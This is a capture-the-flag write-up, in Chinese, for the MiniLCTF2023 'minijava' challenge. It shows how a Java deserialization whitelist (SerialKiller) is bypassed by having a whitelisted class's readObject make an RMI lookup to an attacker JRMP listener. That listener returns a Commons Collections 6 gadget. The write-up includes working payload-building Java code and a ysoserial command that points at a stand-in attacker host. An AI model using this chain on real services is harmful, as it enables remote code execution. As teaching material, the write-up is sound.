# MiniLCTF2023 - minijava

## 题目简述

Spring Boot 应用接收 Base64 Java 序列化数据，并用 `SerialKiller` 配置限制可反序列化的类。依赖中包含 Commons Collections 3.2.1，但常规 CC gadget 会在第一层白名单处被拒绝。

允许的 `User` 类自定义了 `readObject`。当魔数和分支值满足条件时，它会使用对象内可控的 RMI `Registry` 执行 `lookup("hello")`，再调用返回远程对象的 `world(this)`。利用思路是让第一层只反序列化白名单内的 `User` 与 RMI stub，再由恶意 JRMP 服务端向客户端返回第二个、未受 SerialKiller 配置约束的 CC6 payload。

## 解题过程

`User.readObject` 的关键状态机为：

```java
int magic = in.readInt();
byte branch = in.readByte();
switch (branch) {
    case 1:
        in.defaultReadObject();
        break;
    case 2:
        in.defaultReadObject();
        if (!getUsername().equals("L_team")) throw new Exception("Invalid username");
        if (getAge() != 18) throw new Exception("Invalid age");
        Hello hello = (Hello) getRegistry().lookup("hello");
        hello.world(this);
        break;
    default:
        throw new Exception("Invalid magic number");
}
```

直接在 `ObjectOutputStream` 外部先调用 `writeInt`、`writeByte` 是错误的：这些字节会出现在顶层流头之后、对象 token 之前，反序列化器甚至进不了 `User.readObject`。必须在 `User` 类自己的 `writeObject` 中按 `readObject` 期待的顺序写入控制字段：

```java
private void writeObject(ObjectOutputStream out) throws Exception {
    out.writeInt(114514);
    out.writeByte(2);          // 只有分支 2 会触发 RMI lookup
    out.defaultWriteObject();
}
```

随后构造满足检查的对象，把 `registry` 字段改为指向攻击者 1099 端口的 RMI stub：

```java
User user = new User("L_team", 18);
Registry registry = LocateRegistry.getRegistry("ATTACKER_IP", 1099);

Field field = User.class.getDeclaredField("registry");
field.setAccessible(true);
field.set(user, registry);

ByteArrayOutputStream buffer = new ByteArrayOutputStream();
ObjectOutputStream out = new ObjectOutputStream(buffer);
out.writeObject(user);
String payload = Base64.getEncoder().encodeToString(buffer.toByteArray());
System.out.println(payload);
```

攻击机启动 JRMP listener，让 `lookup` 响应携带 CC6 gadget：

```bash
java -cp ysoserial-all.jar \
  ysoserial.exploit.JRMPListener 1099 \
  CommonsCollections6 "touch /tmp/minil-rce"
```

先用无歧义命令验证执行，再换成适合远程环境的 flag 回传命令。第一层流中只有白名单允许的 `User`、基础 Java 类和 RMI stub；第二层对象由 RMI 客户端自己的反序列化路径读取，从而绕过原入口的 `SerialKiller`。仓库只保存占位 flag，官方 WP 也未记录真实远程回包。

## 方法总结

反序列化白名单只能保护它包裹的那一个 `ObjectInputStream`。白名单类若在 `readObject` 中继续访问 RMI、JNDI 或其他会反序列化远端数据的协议，就会产生新的输入边界。构造 payload 时还要严格匹配 Java 序列化调用顺序：控制字段属于对象自定义数据，必须由该对象的 `writeObject` 写入，而不是追加在顶层流前后。
